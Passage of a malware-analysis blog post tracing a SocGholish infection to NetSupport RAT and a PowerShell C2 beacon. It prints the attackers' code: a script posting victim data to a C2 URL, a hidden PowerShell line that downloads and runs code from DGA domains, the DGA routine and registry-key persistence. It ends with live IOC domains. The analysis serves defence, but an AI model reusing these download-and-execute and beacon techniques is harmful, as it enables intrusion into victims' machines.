		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda.org/gotoCheckout&#39;</span>,<span style="color:#66d9ef">false</span>);
		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>);
		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">payload</span>);
		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">retbinary</span>){
			<span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">responseBody</span>;
		}
		<span style="color:#66d9ef">else</span>{
			<span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">responseText</span>;
		}
		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>;
	}
	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
}
</code></pre></div><p>Similar to the previous script, this will gather some info about the victim machine, format the results, and send a response back to the C2.</p>
<p>The big difference between the two is the use of PowerShell to download and execute a file called <code>f23.svg</code>.</p>
<p>At this point, the <code>*.nodes.gammalambdalambda.org</code> did not respond, and even if it did, there is no functionality in place to execute the response.</p>
<p>I will now pivot my focus to the file which has been downloaded and executed via PowerShell.</p>
<h2 id="powershell---wudugftopf23svg">PowerShell - wudugf.top/f23.svg</h2>
<p>At first glance, the PowerShell is rather simple, there are two very large base64 encoded strings which are passed to a &ldquo;decode&rdquo; function.</p>
<p>The decode function converts the strings from base64, and then loops through each element of the string and XORs them with an index of a hardcoded key.</p>
<p>Once the string has been XOR&rsquo;d, it is decompressed using Gzip and returned.</p>
<p>The first base64 string is passed to the decode function and returned to a variable I&rsquo;ve named <code>$zip_file</code> - you&rsquo;ll see why in the next section.</p>
<p>The second base64 string is decoded and then piped to IEX - more PowerShell to explore.</p>
<h3 id="nested-powershell">Nested PowerShell</h3>
<p>The nested PowerShell has two primary purposes, which are seemingly unrelated to each other.</p>
<p>One of these purposes is to extract and deploy the NetSupport RAT, which is commonly observed being deployed by SocGholish infrastructure. The specific PowerShell behavior has also been <a href="https://blog.cyble.com/2022/09/21/netsupport-rat-distributed-via-socgholish/">documented</a> by other researchers in the past.</p>
<p>The second purpose is to deploy a separate PowerShell C2 beacon. It is interesting to see two payloads being deployed by the same C2 server, although SocGholish is known to be an initial access broker.</p>
<h3 id="nested-powershell-netsupport-rat">Nested PowerShell: NetSupport RAT</h3>
<p>The first primary purpose of the nested PowerShell is to extract the contents of the <code>$zip_file</code> variable using <code>[IO.Compression.Zipfile]::ExtractToDirectory</code>.</p>
<p>This zip file will be saved to the user&rsquo;s <code>$env:appdata</code> folder under a randomly named directory.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/netsupport_rat.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/netsupport_rat.png"
            alt="netsupport_rat"
            />
    </a>
    
</figure>
This zip file contains the NetSupport RAT binary as well as its dependencies.</p>
<p>After the NetSupport RAT folder has been extracted, the <code>client32.exe</code> file is renamed to <code>whost.exe</code>.</p>
<p>Persistence is established by adding the registry key &ldquo;ExpirienceHost&rdquo; under <code>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</code>, with the value set to the full path of the NetSupport RAT binary.</p>
<p>Once persistence is established, <code>Invoke-WmiMethod</code> is used to execute NetSupport RAT.</p>
<p>NetSupport RAT has been around for quite a while, and for those curious to learn more about it, good writeups can be easily found via a web search.</p>
<h3 id="nested-powershell-powershell-beacon">Nested PowerShell: PowerShell Beacon</h3>
<p>This is where things, in my opinion, get more interesting.</p>
<p>The second purpose of the nested PowerShell is to deploy a PowerShell C2 beacon.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">start-process powershell -args <span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">	new-alias rzs $(&#39;</span>invoke-expression<span style="color:#e6db74">&#39;) ;
</span><span style="color:#e6db74">	$rand_int = New-Object ($(&#39;</span>System.Random<span style="color:#e6db74">&#39;) )([int]((((Get-Date).DayOfYear+3) / 7) +2024)*1562);
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">	for ($i = 0; $i -lt 15; $i++) {
</span><span style="color:#e6db74">		$rand_str += ($(&#39;</span>abcdefghijklmn<span style="color:#e6db74">&#39;) )[$rand_int.Next(0, 14)];
</span><span style="color:#e6db74">	}
</span><span style="color:#e6db74">	$global:block=(New-Object $(&#39;</span>System.Net.WebClient<span style="color:#e6db74">&#39;) ).($(&#39;</span>DownloadString<span style="color:#e6db74">&#39;) )($(&#39;</span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#e6db74">&#39;) +$rand_str+$(.top/523/sdfzw.php?i=) +$(hostname));
</span><span style="color:#e6db74">	rzs $global:block&#39;</span>
-WindowStyle hidden
</code></pre></div><p>As shown above, a request will be made to a DGA generated <code>.top</code> domain, all with the same hardcoded path of <code>/&lt;group_id&gt;/sdfzw.php</code>, and the victim hostname passed as a parameter in the format <code>?i=&lt;hostname&gt;</code>.</p>
<p>The response from the <code>.top</code> domain will be saved to a global variable, <code>$global:block</code>, and then executed. We will explore this in the next section.</p>
<h2 id="powershell-beacon---asyncrat">PowerShell Beacon - AsyncRAT</h2>
<p>Note: I noticed the PowerShell beacon has striking similarities to <a href="https://securitynews.sonicwall.com/xmlpost/github-available-asyncrat-going-fileless/">AsyncRAT</a>, and could be inspired by it.</p>
<p>The response from the <code>.top</code> domain was roughly 580KB of raw PowerShell, which, as we saw previously, is piped directly to IEX.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/sdfzw_php_response.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/sdfzw_php_response.png"
            alt="sdfzw_php_response"
            />
    </a>
    
</figure>
<p>I went to work formatting and attempting to deobfuscate.</p>
<p>Here is the original <a href="https://gist.github.com/rerednawyerg/ddc6c5c647e00c18a9c40536525b74c9">obfuscated payload</a>, and here is a <a href="https://gist.github.com/rerednawyerg/9632d828b05ee74eaa2928b37fe5d921">link</a> to the fully cleaned version to follow along with as you read.</p>
<p>The first 150 or so lines are simple aliases, and a few lines later, TypeAccelerators are used to create aliases for .NET framework classes.</p>
<p>A few .NET core classes are manually added, and then Invoke-Expression is called on a here-string, which is where the meat of the beacon lives.</p>
<h3 id="domain-generating-algorithm-dga">Domain Generating Algorithm (DGA)</h3>
<p>After executing the here-string, the first thing the beacon does is create a list of domains.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">static <span style="color:#66d9ef">[void]</span> create_c2s(){ 
	$temp_arr=@();
	$date = Get-Date;
	$week_of_year = <span style="color:#66d9ef">[int]</span>($date.((<span style="color:#e6db74">&#39;DayOfYear&#39;</span>)) / 7) + 1;
	$year = $date.((<span style="color:#e6db74">&#39;Year&#39;</span>));
	$seed_value = $week_of_year + $year * (429374);
	$random_obj = New-Object ((<span style="color:#e6db74">&#39;System.Random&#39;</span>))($seed_value);

	$fifteen = 15;
	$alphanumeric = (<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span>);

	<span style="color:#66d9ef">for</span> ($i = 0; $i <span style="color:#f92672">-lt</span> 10; $i++) { 
		$temp_str = <span style="color:#e6db74">&#34;&#34;</span>;

		<span style="color:#66d9ef">for</span> ($j = 0; $j <span style="color:#f92672">-lt</span> $fifteen; $j++) { 
			$rand_index=$random_obj.((<span style="color:#e6db74">&#39;next&#39;</span>))(0, $alphanumeric.Length);
			$temp_str += $alphanumeric[$rand_index];
		}
		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.top&#39;</span>);
		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.fun&#39;</span>);
		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.com&#39;</span>);
		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.cn&#39;</span>);

	} 
	<span style="color:#66d9ef">[C2s_class]</span>::c2_array=$temp_arr 
}
</code></pre></div><p>Ten domains will be generated, each fifteen characters in length, and at first glance these domains will be completely random.</p>
<p>However, the <code>$week_of_year</code> variable will help control the output of the Random object which is created with the seed value, and is a common practice in DGAs.</p>
<p>To demonstrate, running the following will always produce the same series of digits in <code>$random_obj</code>, the first four of which are: 35, 23, 10, and 2.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Powershell" data-lang="Powershell">$date = Get-Date;
$day_of_year = 25;
$year = $date.((<span style="color:#e6db74">&#39;Year&#39;</span>));
$seed_value = $day_of_year + $year * (429374);
$random_obj = New-Object ((<span style="color:#e6db74">&#39;System.Random&#39;</span>))($seed_value);
$fifteen = 15;
$alphanumeric = (<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span>);
</code></pre></div><p>If we select the characters at the index of <code>$alphanumeric</code> which correspond with these digits, we get <code>9xkc..</code>.</p>
<p>Spoiler alert, the domain which responds to the C2 beacon during the 25th week of the year is <code>9xkcaayaagvr1p2[.]top</code>.</p>
<p>Hypothetically, this could be used to predict the C2 domains which will be used over the next weeks or months.</p>
<p>Of course, all the threat actor has to do is change the hardcoded digit used to generate the seed value and the output will be altered, so this information, while interesting, probably doesn&rsquo;t have much real-world value.</p>
<h3 id="mutex">Mutex</h3>
<p>Once the domains have been generated, the beacon checks whether a mutex named <code>rusgugh</code> exists, and if so, the beacon will terminate.</p>
<p>If the mutex does not exist, it will be created, and execution continues.</p>
<h3 id="connect-to-c2">Connect to C2</h3>
<p>With the domains created and the mutex check completed, the beacon now enters an infinite loop, calling a series of functions which will communicate with a C2 server.</p>
<p>The beacon will determine if any of the generated domains resolve to an IP address, and if so, will use a TCP socket to connect to it on port <code>14235</code>.</p>
<p>If the beacon connects to the C2 successfully, it will then gather data about the victim device and send it to the C2 via an SslStream object.</p>
<h3 id="device-enumeration">Device Enumeration</h3>
<p>The beacon will gather the following data about the device:</p>
<ul>
<li>AV Products</li>
<li>IP address (using api.ipify.org)</li>
<li>Device Name</li>
<li>User Name</li>
<li>OS Arch Type (64bit or 32bit)</li>
<li>Whether the user is in the built-in administrator role</li>
<li>Whether the device is domain joined</li>
</ul>
<p>This data is organized in a hashtable, converted to JSON, and then Gzip compressed. The compressed data is converted to a byte array and sent to the C2 via the SSL stream.</p>
<h3 id="c2-server-response">C2 Server Response</h3>
<p>Once the C2 responds, the beacon parses the response. If it determines there are commands to be executed, it passes the response to another function, which I&rsquo;ve named <code>perform_c2_command</code>.</p>
<p>The function will Gzip decompress the response, and convert it from JSON into a hashtable.</p>
<p>Then, the value of the <code>Packet</code> key in the hashtable is passed to a switch statement, and different actions are performed.</p>
<p>Valid switch statement values:</p>
<pre><code class="language-String" data-lang="String">&lt;random_string&gt; - sends a global count variable back to the C2.
plugin - stores an argument string for a DLL sent by the C2 into a global variable
iex - converts contents of the hashtable's `script` key from base64 and passes it to IEX
cmd - calls start-process using the values of the hashtable's `cmd` and `args` keys as parameters
selfdelete - performs &quot;remove-item $PWD\* -force -recurse exit&quot;
savePlugin - passes a base64 encoded .NET assembly to the &quot;run_dll&quot; function
</code></pre><p>All responses to the C2 commands are gzipped and sent back over the SSL stream.</p>
<p>The <code>run_dll</code> function mentioned in the <code>savePlugin</code> switch takes the base64 encoded byte array, reflectively loads it, and creates an instance of the specified type.</p>
<p>It then calls the <code>Run</code> method on the instance with the following arguments:</p>
<pre><code class="language-String" data-lang="String">$plugin_instance.(('Run'))(
[customclass1]::tcp_socket, 
[C2s_class]::ptr_raw_certificate, 
[C2s_class]::machine_name, 
[System.Convert]::(('FromBase64String'))([customclass1]::global_saved_parameter), 
[mutex_class]::mutex, 
$null, $null, $null  );
</code></pre><p>The beacon now continues on an infinite loop, waiting for commands from the C2 server.</p>
<h2 id="emulation">Emulation</h2>
<p>For fun, lets see if we can emulate a victim machine and coax some responses out of the C2 server.</p>
<p>I modified the script to log specific operations as well as requests and responses to and from the server.</p>
<p>Currently getting mixed results and haven&rsquo;t had enough time to explore it fully - I will dig into the responses in Part 4.</p>
<h2 id="final-thoughts">Final Thoughts</h2>
<p>Starting with a site infected with a SocGholish inject, I have traced it all the way to a dual payload of NetSupport RAT and an unknown PowerShell C2 beacon framework. As mentioned, this PowerShell C2 shares strong similarities to AynscRAT and DcRat, and likely took some inspiration from these projects.</p>
<p>I would like to give thanks and credit to <a href="https://infosec.exchange/@rmceoin">@rmceoin</a> for providing great feedback and tips while I was working through this post.</p>
<h2 id="execution-flow-chart">Execution Flow Chart</h2>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/SocGholish_Flow.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/SocGholish_Flow.png"
            alt="SocGholish_flow"
            />
    </a>
    
</figure>
<h2 id="iocs">IOCs</h2>
<p>SocGholish Stage 2:</p>
<ul>
<li>templates.jdlaytongrademaker[.]com</li>
</ul>
<p>SocGholish Stage 3:</p>
<ul>
<li>*.nodes.gammalambdalambda[.]org</li>
</ul>
<p>SocGholish Final Payload Dropper:</p>
<ul>
<li>wudugf[.]top/f23.svg</li>
</ul>
<p>NetSupport RAT:</p>
<ul>
<li>Gateway Address: weubhb[.]top:443</li>
<li>SecondaryGateway: ssdgsg4knmb[.]cn:443</li>
</ul>
<p>PowerShell Beacon Dropper:</p>
<ul>
<li>http://&lt;rand_str&gt;.top/523/sdfzw.php?i=&lt;hostname&gt;</li>
</ul>
<p>PowerShell C2 Beacon:</p>
<ul>
<li>r89kq6esetljq7r[.]top:14235</li>
<li>45.77.195.105</li>
</ul>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
      
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2023-06-19 07:20
        

         
          
        
      </p>
    </div>
      <hr />
   
        













  

  

  

  

  








  


 






<style>
.resp-sharing-button__link,
.resp-sharing-button__icon {
  display: inline-block
}

.resp-sharing-button__link {
  text-decoration: none;
  color: #fff !important;
  margin: 0.5em
}

.resp-sharing-button {
  border-radius: 5px;
  transition: 25ms ease-out;
  padding: 0.5em 0.75em;
  font-family: Helvetica Neue,Helvetica,Arial,sans-serif;
  
}

.resp-sharing-button__icon svg {
  width: 1em;
  height: 1em;
  margin-right: 0.4em;
  vertical-align: middle
}

.resp-sharing-button--small svg {
  margin: 0;
  vertical-align: middle
}

 
.resp-sharing-button__icon {
  stroke: #fff;
  fill: none
}

 
.resp-sharing-button__icon--solid,
.resp-sharing-button__icon--solidcircle {
  fill: #fff;
  stroke: none
}

.resp-sharing-button--twitter {
  background-color: #55acee
}

.resp-sharing-button--twitter:hover {
  background-color: #2795e9
}

.resp-sharing-button--pinterest {
  background-color: #bd081c
}

.resp-sharing-button--pinterest:hover {
  background-color: #8c0615
}

.resp-sharing-button--facebook {
  background-color: #3b5998
}

.resp-sharing-button--facebook:hover {
  background-color: #2d4373
}

.resp-sharing-button--tumblr {
  background-color: #35465C
}

.resp-sharing-button--tumblr:hover {
  background-color: #222d3c
}

.resp-sharing-button--reddit {
  background-color: #ff4500
}

.resp-sharing-button--reddit:hover {
  background-color: #3a80c1
}

.resp-sharing-button--google {
  background-color: #dd4b39
}

.resp-sharing-button--google:hover {
  background-color: #c23321
}

.resp-sharing-button--linkedin {
  background-color: #0077b5
}

.resp-sharing-button--linkedin:hover {
  background-color: #046293
}

.resp-sharing-button--email {
  background-color: #777
}

.resp-sharing-button--email:hover {
  background-color: #5e5e5e
}

.resp-sharing-button--xing {
  background-color: #1a7576
}

.resp-sharing-button--xing:hover {
  background-color: #114c4c
}

.resp-sharing-button--whatsapp {
  background-color: #25D366
}

.resp-sharing-button--whatsapp:hover {
  background-color: #1da851
}

.resp-sharing-button--hackernews {
background-color: #FF6600
}
.resp-sharing-button--hackernews:hover, .resp-sharing-button--hackernews:focus {   background-color: #FB6200 }

.resp-sharing-button--vk {
  background-color: #507299
}

.resp-sharing-button--vk:hover {
  background-color: #43648c
}

.resp-sharing-button--facebook {
  background-color: #3b5998;
  border-color: #3b5998;
}

.resp-sharing-button--facebook:hover,
.resp-sharing-button--facebook:active {
  background-color: #2d4373;
  border-color: #2d4373;
}

.resp-sharing-button--twitter {
  background-color: #55acee;
  border-color: #55acee;
}

.resp-sharing-button--twitter:hover,
.resp-sharing-button--twitter:active {
  background-color: #2795e9;
  border-color: #2795e9;
}

.resp-sharing-button--tumblr {
  background-color: #35465C;
  border-color: #35465C;
}

.resp-sharing-button--tumblr:hover,
.resp-sharing-button--tumblr:active {
  background-color: #222d3c;
  border-color: #222d3c;
}

.resp-sharing-button--email {
  background-color: #777777;
  border-color: #777777;
}

.resp-sharing-button--email:hover,
.resp-sharing-button--email:active {
  background-color: #5e5e5e;
  border-color: #5e5e5e;
}

.resp-sharing-button--pinterest {
  background-color: #bd081c;
  border-color: #bd081c;
}

.resp-sharing-button--pinterest:hover,
.resp-sharing-button--pinterest:active {
  background-color: #8c0615;
  border-color: #8c0615;
}

.resp-sharing-button--linkedin {
  background-color: #0077b5;
  border-color: #0077b5;
}

.resp-sharing-button--linkedin:hover,
.resp-sharing-button--linkedin:active {
  background-color: #046293;
  border-color: #046293;
}

.resp-sharing-button--reddit {
  background-color: #ff4500;
  border-color: #ff4500;
}

.resp-sharing-button--reddit:hover,
.resp-sharing-button--reddit:active {
  background-color: #ff5700;
  border-color: #ff5700;
}

.resp-sharing-button--xing {
  background-color: #1a7576;
  border-color: #1a7576;
}

.resp-sharing-button--xing:hover
.resp-sharing-button--xing:active {
  background-color: #114C4C;
  border-color: #114C4C;
}

.resp-sharing-button--whatsapp {
  background-color: #25D366;
  border-color: #25D366;
}

.resp-sharing-button--whatsapp:hover,
.resp-sharing-button--whatsapp:active {
  background-color: #1DA851;
  border-color: #1DA851;
}

.resp-sharing-button--hackernews {
  background-color: #FF6600;
  border-color: #FF6600;
}

.resp-sharing-button--hackernews:hover
.resp-sharing-button--hackernews:active {
  background-color: #FB6200;
  border-color: #FB6200;
}

.resp-sharing-button--vk {
  background-color: #507299;
  border-color: #507299;
}

.resp-sharing-button--vk:hover
.resp-sharing-button--vk:active {
  background-color: #43648c;
  border-color: #43648c;
}

.resp-sharing-button--telegram {
  background-color: #54A9EB;
}

.resp-sharing-button--telegram:hover {
  background-color: #4B97D1;
}
</style>




<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/" target="_blank" rel="noopener" aria-label="" title="Facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z"/></svg>


    </div>
  </div>
</a>




<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?text=SocGholish%20Series%20-%20Part%203&amp;url=https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/" target="_blank" rel="noopener" aria-label="" title="Twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M23.44 4.83c-.8.37-1.5.38-2.22.02.93-.56.98-.96 1.32-2.02-.88.52-1.86.9-2.9 1.1-.82-.88-2-1.43-3.3-1.43-2.5 0-4.55 2.04-4.55 4.54 0 .36.03.7.1 1.04-3.77-.2-7.12-2-9.36-4.75-.4.67-.6 1.45-.6 2.3 0 1.56.8 2.95 2 3.77-.74-.03-1.44-.23-2.05-.57v.06c0 2.2 1.56 4.03 3.64 4.44-.67.2-1.37.2-2.06.08.58 1.8 2.26 3.12 4.25 3.16C5.78 18.1 3.37 18.74 1 18.46c2 1.3 4.4 2.04 6.97 2.04 8.35 0 12.92-6.92 12.92-12.93 0-.2 0-.4-.02-.6.9-.63 1.96-1.22 2.56-2.14z"/></svg>

    
    </div>
  </div>
</a>










<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/&amp;title=SocGholish%20Series%20-%20Part%203&amp;summary=SocGholish%20Series%20-%20Part%203&amp;https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/" target="_blank" rel="noopener" aria-label="">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 21.5h-5v-13h5v13zM4 6.5C2.5 6.5 1.5 5.3 1.5 4s1-2.4 2.5-2.4c1.6 0 2.5 1 2.6 2.5 0 1.4-1 2.5-2.6 2.5zm11.5 6c-1 0-2 1-2 2v7h-5v-13h5V10s1.6-1.5 4-1.5c3 0 5 2.2 5 6.3v6.7h-5v-7c0-1-1-2-2-2z"/></svg>

    
    </div>
  </div>
</a>




<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/&amp;resubmit=true&amp;title=SocGholish%20Series%20-%20Part%203" target="_blank" rel="noopener" aria-label="" title="Reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M24 11.5c0-1.65-1.35-3-3-3-.96 0-1.86.48-2.42 1.24-1.64-1-3.75-1.64-6.07-1.72.08-1.1.4-3.05 1.52-3.7.72-.4 1.73-.24 3 .5C17.2 6.3 18.46 7.5 20 7.5c1.65 0 3-1.35 3-3s-1.35-3-3-3c-1.38 0-2.54.94-2.88 2.22-1.43-.72-2.64-.8-3.6-.25-1.64.94-1.95 3.47-2 4.55-2.33.08-4.45.7-6.1 1.72C4.86 8.98 3.96 8.5 3 8.5c-1.65 0-3 1.35-3 3 0 1.32.84 2.44 2.05 2.84-.03.22-.05.44-.05.66 0 3.86 4.5 7 10 7s10-3.14 10-7c0-.22-.02-.44-.05-.66 1.2-.4 2.05-1.54 2.05-2.84zM2.3 13.37C1.5 13.07 1 12.35 1 11.5c0-1.1.9-2 2-2 .64 0 1.22.32 1.6.82-1.1.85-1.92 1.9-2.3 3.05zm3.7.13c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm9.8 4.8c-1.08.63-2.42.96-3.8.96-1.4 0-2.74-.34-3.8-.95-.24-.13-.32-.44-.2-.68.15-.24.46-.32.7-.18 1.83 1.06 4.76 1.06 6.6 0 .23-.13.53-.05.67.2.14.23.06.54-.18.67zm.2-2.8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm5.7-2.13c-.38-1.16-1.2-2.2-2.3-3.05.38-.5.97-.82 1.6-.82 1.1 0 2 .9 2 2 0 .84-.53 1.57-1.3 1.87z"/></svg>

    
    </div>
  </div>
</a>








<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/&amp;t=SocGholish%20Series%20-%20Part%203" target="_blank" rel="noopener" aria-label="">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 140"><path fill-rule="evenodd" d="M60.94 82.314L17 0h20.08l25.85 52.093c.397.927.86 1.888 1.39 2.883.53.994.995 2.02 1.393 3.08.265.4.463.764.596 1.095.13.334.262.63.395.898.662 1.325 1.26 2.618 1.79 3.877.53 1.26.993 2.42 1.39 3.48 1.06-2.254 2.22-4.673 3.48-7.258 1.26-2.585 2.552-5.27 3.877-8.052L103.49 0h18.69L77.84 83.308v53.087h-16.9v-54.08z"></path></svg>

      
    </div>
  </div>
</a>









    
    <div class="pagination">
        
        <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
        </div>
        

        <div class="pagination__buttons">
            

            
            <span class="button next">
                <a href="https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/">
                    <span class="button__text">Unraveling a Stealc Dropper</span>
                    <span class="button__icon">â†’</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.97a8045a726eccf303b74163251eb214dcb8fce3e0eaddb67866dc97cd45bb5954e4edd26e063cf1b285743e3331ab3a31a0ba5703b1fced4a406fc7b7205eb3.js" integrity="sha512-l6gEWnJuzPMDt0FjJR6yFNy4/OPg6t22eGbcl81Fu1lU5O3SbgY88bKFdD4zMas6MaC6VwOx/O1KQG/HtyBesw=="></script>



    </body>
</html>
